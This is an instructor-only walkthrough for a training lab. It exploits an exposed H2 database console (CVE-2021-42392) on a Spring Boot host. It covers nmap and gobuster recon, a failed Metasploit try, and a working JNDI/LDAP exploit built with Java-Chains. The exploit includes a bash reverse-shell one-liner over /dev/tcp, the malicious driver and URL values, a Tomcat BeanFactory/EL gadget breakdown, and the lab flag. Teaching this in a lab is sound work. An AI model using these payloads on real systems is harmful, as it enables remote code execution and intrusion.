---
id: B02.M14-walkthrough
title: Dallas — Instructor Walkthrough
artifact_type: activity_walkthrough
audience: instructor
block: B02
module_type: lab
legacy_aliases:
- legacy/week2/labs/pcte_vulnhub_targets/walkthroughs/05-target5-h2-database.md
source_kind: markdown
render_mode: generate
source_status: authored
review_required: false
output_formats:
- docx
- pdf
sensitivity: instructor_only
references:
- path: ./answer-key.md
---

# Dallas — Instructor Walkthrough

## Objective and starting context

Live instructor demo for the Dallas Module (`B02.M14`). Students know only the assigned subnet `192.168.14.0/24`. Do not open with the product name, CVE, or host IP.

This walkthrough is rewritten onto the `192.168.14.0/24` student-facing range. Example host addresses in later steps use the `.10` (and, where present, `.11`) convention from the shared stack; treat those as discovered values, not pre-briefed facts.

The deploy flag key is `T5_FLAG`. Confirm the live `.env` value before grading.


## Required Tools
* `iproute2` (for adding static routes when your host has no path to the target subnet)
* `nmap` (for host discovery and port scanning)
* `gobuster` (directory enumeration against the Spring Boot web root)
* `curl` (HTTP headers, form inspection, optional login POST)
* a web browser (H2 Console login — the usual way to submit Driver Class / JDBC URL)
* `python3` (pretty-print the Spring Boot JSON 404)
* Docker (recommended) **or** `java` **JDK 8** for [Java-Chains](https://github.com/vulhub/java-chains) — the JNDI payload generator used by the Vulhub PoC ([quick-start guide](https://java-chains.vulhub.org/docs/guide))
* `nc` (Netcat, for catching the reverse shell)
* `metasploit-framework` (section 4 — stock `h2_webinterface_rce` is the wrong CVE class; it does not shell this host)

Java-Chains is needed in section 4, not during initial recon. You can install/start it while enumerating.

```bash
# Option A: Docker (recommended; works even if the host JDK is newer than 8)
# Prefer --network host so the target can reach LDAP on your lab-facing IP
docker run -d --name java-chains --restart=always --network host \
  -e CHAINS_AUTH=true -e CHAINS_PASS= \
  javachains/javachains:latest

# Option B: JAR (requires JDK 8 — Temurin/Azul Zulu recommended)
java -jar java-chains-[version].jar
```

The web UI listens on port `8011` (example: `http://192.168.100.1:8011`). If auth is enabled and `CHAINS_PASS` is empty, read the generated password from the container logs / startup output.

Before generating JNDI URLs, open the Servers panel (or POST `/jndiControl`) and set the **public/client IP** to your attacker address on the lab-facing LAN so LDAP/RMI/HTTP URLs are reachable from the target (not `127.0.0.1`, and not an auto-detected WAN IP).

## 1. Network Routing & Host Discovery

At the start of this scenario, we only know the target subnet: `192.168.14.0/24`. We are positioned on the external lab network (`192.168.100.0/24`).

If your host does not already have a route into that Class C, add one via the lab router (address and path vary by deployment):

```bash
sudo ip route add 192.168.14.0/24 via 192.168.100.254
```

With connectivity available, find which addresses on the subnet actually answer. `nmap -sn` is a ping sweep: it checks host up/down and **does not** port-scan. That is cheaper than a full TCP scan of every IP, and we only have a subnet so far — we still need a live host before we care about services.

```bash
nmap -sn 192.168.14.0/24
```

*Output excerpt:*
```text
Nmap scan report for 192.168.14.1
Host is up.
Nmap scan report for 192.168.14.10
Host is up.
Nmap scan report for 192.168.14.254
Host is up.
```

**Observation:** Three hosts respond on this subnet.

**Inference:** In this lab layout, `.254` is typically the lab router on the segment and `.1` is often the Docker bridge gateway. Concentrate service enumeration on **192.168.14.10**.

## 2. Service Enumeration

We have a candidate IP. Next question: **what is listening, and what does it claim to be?** That takes a version scan, not another ping sweep.

```bash
nmap -Pn -sV -p- 192.168.14.10
```

*Why these options:*

* `-Pn` — skip nmap’s host-discovery probes. We already know `192.168.14.10` responded to `-sn`. This also keeps the scan going if the host later ignores ping but still serves TCP.
* `-sV` — version detection. An open `8080/tcp` labeled only `http` is not enough; we need the product string (here, **Apache Tomcat**). JDWP on **5005** also prints a JVM version.
* `-p-` — all 65535 TCP ports, not nmap’s default top 1000. **5005** (JDWP) is easy to miss on a top-ports-only scan; **8080** is more likely to appear either way.

*Output excerpt:*
```text
PORT     STATE SERVICE VERSION
5005/tcp open  jdwp    Java Debug Wire Protocol (Reference Implementation) version 1.8 1.8.0_302
8080/tcp open  http    Apache Tomcat (language: en)
```

**Observation:** Port 8080 is HTTP identified as Apache Tomcat. Port 5005 is JDWP and fingerprints the JVM as **Java 8u302**.

**Inference:** JDWP is a debugger listener, not the web app. Remember **8u302** when choosing a JNDI payload later: recent JDKs disable remote codebase loading (`trustURLCodebase`), so a plain “download `.class` over LDAP” payload is unlikely. Confirm what the HTTP service actually is. Use **`:8080`** in URLs because that is the web listener nmap found (not 80).

### Initial Web Probing

nmap told us HTTP on **8080**. Confirm that with a normal GET — headers and body. This is ordinary recon `curl`, not an exploit. You can also open `http://192.168.14.10:8080/` in a browser; the JSON error is the same.

```bash
curl -s -D - http://192.168.14.10:8080/ -o /tmp/t5-root.json | head -12
python3 -m json.tool < /tmp/t5-root.json
```

*Why this `curl`:*

* `-s` — silent; drop the progress meter.
* `-D -` — write response **headers** to stdout (`Content-Type`, status).
* `-o /tmp/t5-root.json` — write the **body** to a file so headers and JSON stay separated.
* `| head -12` — only the first header lines.
* `python3 -m json.tool` — indent the saved body so the error fields are readable.

*Header / body excerpt:*
```text
HTTP/1.1 404
Content-Type: application/json
```
```json
{
    "timestamp": "2026-07-09T19:22:21.849+00:00",
    "status": 404,
    "error": "Not Found",
    "path": "/"
}
```

**Observation:** The JSON body uses the familiar `timestamp` / `status` / `error` / `path` shape.

**Inference:** That matches Spring Boot’s default error attributes ([Spring Boot API: `DefaultErrorAttributes`](https://docs.spring.io/spring-boot/api/java/org/springframework/boot/webmvc/error/DefaultErrorAttributes.html)). Combined with nmap’s Tomcat + Java 8 fingerprint, port 8080 is likely a Spring Boot application embedded in Tomcat — not Tomcat’s default welcome page. We still do not know which optional dev or management surfaces are exposed.

**Next probe:** Brute-force common web paths with **gobuster** before assuming a specific subsystem. Spring Boot returns JSON `404` for unmapped routes, so treat `404` as a miss (gobuster’s default) and look for other status codes such as `200`, `302`, or `500`:

```bash
gobuster dir -u http://192.168.14.10:8080 \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -t 40 --no-error
```

*What gobuster is doing:* `gobuster dir` requests `GET /{word}` for each wordlist line. `-u` is the base URL nmap found. `-w` is Kali’s SecLists `Discovery/Web-Content/common.txt` (includes Spring- and admin-related paths such as `h2-console`). `-t 40` is thread count. `--no-error` hides transient connection noise.

*Output excerpt:*
```text
error                (Status: 500) [Size: 73]
h2-console           (Status: 302) [Size: 0] [--> http://192.168.14.10:8080/h2-console/]
```

**Observation:** Gobuster reports **`/h2-console`** with **HTTP 302** redirecting to `/h2-console/`, plus an `/error` handler returning **500**. That is the first concrete database-related path on this host.

The smaller `/usr/share/wordlists/dirb/common.txt` list does **not** include `h2-console` and, on this target, only surfaces `/error`. Prefer SecLists `common.txt` (or a Spring-focused list) when enumerating Spring Boot apps.

**Candidate selection:** *Search:* `spring boot h2 web console /h2-console` → Spring Boot docs describe an optional H2 console at that path when `spring.h2.console.enabled=true` ([Using H2’s Web Console](https://docs.spring.io/spring-boot/reference/data/sql.html#data.sql.h2-web-console)). Follow the redirect and confirm the console serves HTML:

```bash
curl -s -I http://192.168.14.10:8080/h2-console/
```

*Why `-I`:* `curl -I` sends **HEAD** and prints response headers only. We only need status and `Content-Type` to see that `/h2-console/` is a real HTML app, not another JSON 404.

*Output excerpt:*
```text
HTTP/1.1 200
Content-Type: text/html
```

**Inference:** An H2 Database Web Console is exposed on this Spring Boot host. Inspect the login form next to see whether connection parameters are user-controlled before login succeeds.

The console is a normal HTML form. **Browse to** `http://192.168.14.10:8080/h2-console/` and view the login page (JavaScript redirects to `login.jsp`). The `curl` below is the same inspection for a copy-paste walkthrough.

```bash
HTML=$(curl -s http://192.168.14.10:8080/h2-console/)
JSESSION=$(echo "$HTML" | grep -oE 'jsessionid=[a-f0-9]+' | head -1 | cut -d= -f2)
curl -s "http://192.168.14.10:8080/h2-console/login.jsp?jsessionid=$JSESSION" | grep -iE 'title|Driver Class|JDBC URL|name="driver"|name="url"|value='
```

*Why this extraction / grep:*

* The first `curl` saves the landing HTML. H2 ties the login POST to a **`jsessionid`** in that page.
* `grep -oE 'jsessionid=[a-f0-9]+'` — print only the session token (`-o`), extended regex for hex id.
* `head -1 | cut -d= -f2` — first match, take the value after `=`.
* Second `curl` fetches `login.jsp` with that session.
* `grep -iE 'title|Driver Class|JDBC URL|name="driver"|name="url"|value='` — page identity and the **writable** form fields. We are not hunting a random string; those inputs are how the console opens a database.

*Body excerpt:*
```html
<title>H2 Console</title>
Driver Class:
<input type="text" name="driver" value="org.h2.Driver" ... />
JDBC URL:
<input type="text" name="url" value="jdbc:h2:~/test" ... />
User Name: sa
Password:
```

**Observation:** The target exposes the **H2 Database Web Console**, and the login form lets an unauthenticated user set both **Driver Class** and **JDBC URL** before any successful database login.

**Inference:** The connection attempt itself may instantiate arbitrary Java classes / resolve arbitrary URLs. That is the attack surface to research next.

## 3. Vulnerability Discovery

Writable driver/URL fields on an H2 console are a classic attack surface. Two historically common paths are:

1. Older H2 console abuse (`jdbc:h2:mem:...` / `INIT=RUNSCRIPT ...`) — documented around **CVE-2018-10054**-style techniques.
2. Pre-auth **JNDI injection** when the console will load `javax.naming.InitialContext` as the driver — **CVE-2021-42392** (H2 before **1.4.206**), as described in [JFrog’s write-up](https://jfrog.com/blog/the-jndi-strikes-back-unauthenticated-rce-in-h2-database-console/) and in `vulnhub/h2database/CVE-2021-42392/README.md`.

**What the bug is (CVE-2021-42392):** On Connect, H2 loads whatever class you put in **Driver Class** and uses **JDBC URL** as the argument. If the driver is `javax.naming.InitialContext`, H2 calls `lookup(url)`. An `ldap://...` URL then hits an attacker LDAP server. What that LDAP response can *do* depends on the JDK: this host is **8u302**, so remote `.class` loading is the wrong bet; a **local gadget** (`ResourceRef` / Tomcat `BeanFactory`) is the right one. Section 5 walks that chain. First we need the H2 version and proof that the old INIT login is closed.

### Failed Attempt: Treating This Like the Older H2 INIT / in-memory Login

In the **browser**, leave the default driver and try an in-memory URL (or POST the same fields to `login.do?jsessionid=...`):

```text
Driver Class: org.h2.Driver
JDBC URL:     jdbc:h2:mem:test
User Name:    sa
Password:
```

Submit **Connect**.

*Result (excerpt):*
```text
Database "mem:test" not found, either pre-create it or allow remote database creation
(not recommended in secure environments) [90149-204]
```

*What we learned:*
- Remote/in-memory database creation is blocked (H2’s post-1.4.197 `-ifExists` / remote-create protections).
- The trailing `[90149-204]` identifies **H2 build 204** → version **1.4.204**, which is **before 1.4.206**. That version window still matches the JNDI console bug (**CVE-2021-42392**), while the older INIT login path does not.

A JDBC URL with `INIT=RUNSCRIPT FROM 'http://...'` fails the same way: you never get a session in which to run scripts.

Keeping `org.h2.Driver` and only swapping the URL to `ldap://...` also fails: H2 still parses the string as an H2 database URL. **Both** form fields matter. The Vulhub PoC for this CVE sets Driver Class to `javax.naming.InitialContext`.

**Candidate selection:** Searching from H2 console + JNDI + version **1.4.204** — `H2 console JNDI InitialContext CVE-2021-42392` — confirms the pre-auth JNDI path. Craft a callback with a gadget that works on **Java 8u302** + Tomcat/Spring Boot (ResourceRef / BeanFactory), not a `trustURLCodebase` remote-classload payload.

Section 4 tries Metasploit (wrong CVE class on this host), then the working Java-Chains LDAP URL. Section 5 is why that URL executes on 8u302.

## 4. Automated Path: Metasploit (wrong class), then Java-Chains

`search h2` finds `exploit/linux/http/h2_webinterface_rce`. That module needs a **successful database login** so it can `CREATE ALIAS` (the CVE-2018-10054-style path). Against this target:

```bash
msfconsole -q
```

```text
msf6 > use exploit/linux/http/h2_webinterface_rce
msf6 exploit(linux/http/h2_webinterface_rce) > set RHOSTS 192.168.14.10
msf6 exploit(linux/http/h2_webinterface_rce) > set RPORT 8080
msf6 exploit(linux/http/h2_webinterface_rce) > set TARGETURI /h2-console/
msf6 exploit(linux/http/h2_webinterface_rce) > set USERNAME sa
msf6 exploit(linux/http/h2_webinterface_rce) > set PASSWORD ""
msf6 exploit(linux/http/h2_webinterface_rce) > set DATABASE jdbc:h2:mem:
msf6 exploit(linux/http/h2_webinterface_rce) > check
[*] H2 web interface found, however database connection NOT successful
```

*Why these options:* `RHOSTS` / `RPORT` / `TARGETURI` match the console gobuster found. `USERNAME sa` and empty password are the form defaults. `DATABASE jdbc:h2:mem:` is the in-memory URL the module expects for a creatable DB.

*What we learned:* Metasploit correctly finds the console but cannot log in — the same remote-create block from section 3. Skip this module; it is the wrong CVE class for H2 **1.4.204** with creation disabled.

### Working automated path: Java-Chains `JNDIResourceRefPayload`

The Vulhub PoC uses **Java-Chains** module **`JNDI/JNDIResourceRefPayload`**. On this **Java 8u302** host, a plain remote-`.class` LDAP payload is the wrong answer; Java-Chains instead returns a crafted JNDI reference that abuses **classes already on the Tomcat/Spring Boot classpath** (section 5).

Start a Netcat listener on your attacker host (example uses `192.168.100.1`):

```bash
nc -lvnp 4444
```

In Java-Chains (UI at `:8011`):

1. Open **Servers** and set the **public/client IP** to your lab-facing attacker IP; start the JNDI listeners (LDAP default **50389**).
2. Build chain:

```text
JNDIResourceRefPayload → TomcatElRef → ElConvert → BytecodeConvert → Exec
```

3. Set `Exec` / `cmd` to:

```bash
bash -c 'bash -i >& /dev/tcp/192.168.100.1/4444 0>&1'
```

4. Generate via the **JNDI** generate endpoint and copy the **LDAP** URL (must contain your attacker IP):

```text
ldap://192.168.100.1:50389/<generated-resource>
```

**Browse to** `http://192.168.14.10:8080/h2-console/` and submit **Connect** with:

```text
Driver Class: javax.naming.InitialContext
JDBC URL:     ldap://192.168.100.1:50389/<generated-resource>
User Name:    sa
Password:
```

You can POST the same fields to `login.do?jsessionid=...` with `curl`; the browser form is the normal path.

The connection attempt itself is the trigger. H2 asks `javax.naming.InitialContext` to resolve the LDAP URL; Java-Chains returns a malicious `ResourceRef`; Tomcat’s `BeanFactory` evaluates it and runs the configured command. The login page may still show a follow-on error such as `ClassCastException: javax.el.ELProcessor cannot be cast to javax.sql.DataSource` — that often appears **after** the command has already run.

Check your Netcat listener:

```text
listening on [any] 4444 ...
connect to [192.168.100.1] from (UNKNOWN) [192.168.14.10] 48322
root@f1b0a7c0b7d1:/#
```

From that shell:

```bash
cat /flag.txt
```

*Output:*
```text
scarlet-mantis
```

That is a complete automated path to the flag. Section 5 explains **why** that Java-Chains chain works on this JDK.

## 5. Manual Path: why Java-Chains works on Java 8u302

By section 4 we already know the H2 Console will load `javax.naming.InitialContext` and treat the JDBC URL as a JNDI name. The remaining question is not “how do I click Connect,” but **what the attacker LDAP server should return** when the target looks that name up.

Java-Chains is a payload factory plus listener suite for that problem: the web UI on `:8011` builds the gadget; the LDAP listener on `:50389` answers the target’s lookup. The matching Vulhub environment is `vulnhub/h2database/CVE-2021-42392/README.md`.

### Remote Class Loading vs a Local Gadget Chain

When H2 looks up `ldap://ATTACKER:50389/...`, the LDAP server can answer in more than one way. Two common answers matter here.

**Path A — Remote class loading** (what Target 3’s Log4Shell helper used): the LDAP response tells the JVM to download a remote `.class` from `http://ATTACKER/...` and run it. That only works when the target still trusts remote codebases (`trustURLCodebase`). Target 3’s older JDK (**8u102**) often still allowed that. This target’s **Java 8u302** largely closes that door: the lookup may reach your LDAP server, but the JVM will not download and execute attacker bytecode.

**Path B — Local gadget chain** (what this target needs): instead of shipping new code, the LDAP response returns a crafted Java object (here a Tomcat-style `ResourceRef`) that only references **classes already on the target’s classpath**.

In this context:

- A **gadget** is an existing class on the host that has a useful side effect when the JVM or a framework (Tomcat’s `BeanFactory`, EL processor, etc.) resolves it — for example, running a string as a command.
- A **gadget chain** is a short sequence of those classes wired together so the first object is something JNDI/Tomcat will accept, each hop transforms or interprets the next, and the last hop reaches OS command execution.
- **Local** means no new bytecode has to be downloaded. The attacker supplies only the *recipe* (which existing classes to instantiate and how to point them at each other). The target already has the ingredients because it is running Tomcat / Spring Boot.

Enumeration already showed Tomcat on 8080, Java 8u302, and a Spring Boot app with an H2 console — so Tomcat’s BeanFactory / EL classes are on the classpath. That is why Path B is the right hypothesis for this host.

### What the Java-Chains Modules Do

The Vulhub PoC builds this sequence:

```text
JNDIResourceRefPayload → TomcatElRef → ElConvert → BytecodeConvert → Exec
```

| Link | Role on this target |
|------|---------------------|
| **JNDIResourceRefPayload** | LDAP returns a `ResourceRef` (BeanFactory-style reference), **not** a remote codebase URL |
| **TomcatElRef** | Points that reference at Tomcat’s own factory / EL entry point already on the host |
| **ElConvert / BytecodeConvert** | Turns the reference into evaluation of attacker-controlled expression/bytecode using **local** libraries |
| **Exec** | Ends in OS command execution (the reverse-shell line you configured) |

You are not writing those classes by hand. Java-Chains builds the serialized reference; the target’s Tomcat stack does the dangerous work because those classes were already there for normal app-server behavior.

### Example: Following One Reference Through the Stack

This is the classic Tomcat `BeanFactory` + `ELProcessor` shape that Java-Chains’ chain is building toward. Live Java-Chains EL may be denser or more obfuscated; the **layering** is what matters.

**Layer 0 — What you transmit (H2 form)**

Only two attacker-controlled strings leave the browser:

```text
Driver Class:  javax.naming.InitialContext
JDBC URL:      ldap://192.168.100.1:50389/abc123
```

Nothing in that HTTP POST is a gadget yet — only “which class to load” and “what name to look up.”

**Layer 1 — How H2 interprets those strings**

H2’s connection helper roughly:

1. Loads class `javax.naming.InitialContext`
2. Because that class is a JNDI `Context`, calls `lookup("ldap://192.168.100.1:50389/abc123")`

The string that goes on the wire to the attacker is an LDAP search for name `abc123`. Still no command execution — only a directory lookup.

**Layer 2 — What LDAP returns (the gadget recipe)**

Instead of “download `Evil.class` from HTTP,” Java-Chains answers with a JNDI **`Reference`** — metadata naming classes **already on the target**. Conceptually:

```text
Reference {
  className:  "javax.el.ELProcessor"
  factory:    "org.apache.naming.factory.BeanFactory"
  addrs: [
    { type: "forceString", content: "x=eval" },
    { type: "x",           content: "<EL expression that ends in Runtime.exec(...)>" }
  ]
}
```

| Field | Meaning |
|-------|---------|
| `factory = BeanFactory` | Ask **Tomcat’s** factory to build this object (local class) |
| `className = ELProcessor` | The object to build is an **EL evaluator** (also local) |
| `forceString = x=eval` | Treat property `x` as a call to method `eval` |
| `x = <EL expr>` | The argument to `eval` is this attacker string |

That `Reference` is the start of the local gadget chain: a recipe, not new bytecode.

**Layer 3 — How Tomcat’s `BeanFactory` interprets the Reference**

JNDI hands the `Reference` to `org.apache.naming.factory.BeanFactory`, which roughly:

1. Instantiates `javax.el.ELProcessor`
2. Sees `forceString: x=eval` → maps setting `x` to calling `eval(...)`
3. Calls `elProcessor.eval("<EL expression>")`

A local factory has turned directory metadata into a method call on a local class.

**Layer 4 — How the EL / Exec layer runs a command**

The EL string is where `ElConvert` → `BytecodeConvert` → `Exec` show up. A simplified teaching form of the end state:

```text
"".getClass()
  .forName("java.lang.Runtime")
  .getMethod("getRuntime")
  .invoke(null)
  .exec(new String[]{"bash","-c","bash -i >& /dev/tcp/192.168.100.1/4444 0>&1"})
```

`ELProcessor.eval` runs attacker-controlled expression language; that expression reflects into `Runtime.exec`; the OS runs the reverse shell into Netcat.

**Layer 5 — Why H2 may still error afterward**

After the chain runs, H2 expects a `DataSource`. It got an `ELProcessor` (or similar) instead, so you often see `ClassCastException: ... cannot be cast to javax.sql.DataSource`. That is post-exploitation noise — check Netcat first.

```text
[Browser]  driver=InitialContext  url=ldap://ATTACKER:50389/abc123
    │
    ▼
[H2]       InitialContext.lookup(url)          ← only your two strings
    │
    ▼
[LDAP]     returns Reference                   ← gadget RECIPE (local class names)
    │
    ▼
[Tomcat]   BeanFactory → ELProcessor.eval(...) ← local factory + local EL
    │
    ▼
[OS]       Runtime.exec → reverse shell
    │
    ▼
[H2]       ClassCastException (optional)       ← ignore if nc has a shell
```

### Operator Setup That Must Be Correct

Java-Chains listens on several ports. For this lab the important ones are:

| Port | Role |
|------|------|
| **8011** | Web UI / payload generate |
| **50389** | LDAP (what H2 contacts) |
| **58080** | HTTP bytecode helper used by some chains |

Your **Netcat** listener is separate: that is where `Exec`’s reverse shell lands.

When Java-Chains generates an LDAP URL, it embeds an IP the **target** must dial back to:

```text
ldap://<attacker-ip>:50389/<resource-id>
```

If that IP is `127.0.0.1` (auto-detect inside Docker) or some WAN address the lab cannot reach, the H2 lookup never hits your listener and Netcat stays quiet even though the form was submitted correctly. Set the **public/client IP** in Java-Chains’ Servers panel to your lab-facing attacker address — the address the target can route to — before generating the URL.

### End-to-End Flow After You Click Connect

1. H2 Console loads `javax.naming.InitialContext` as the “driver” and looks up the JDBC URL as a JNDI name.
2. The target opens an LDAP connection to your Java-Chains listener on **50389**.
3. Java-Chains returns the crafted `ResourceRef` for that resource id (the local gadget chain above).
4. Tomcat’s `BeanFactory` / EL path evaluates it and runs `Exec`.
5. H2 may still throw a follow-on error such as `ClassCastException: javax.el.ELProcessor cannot be cast to javax.sql.DataSource` — it expected a `DataSource`. That often appears **after** the command has already run; check Netcat first.

Target 5 is complete.
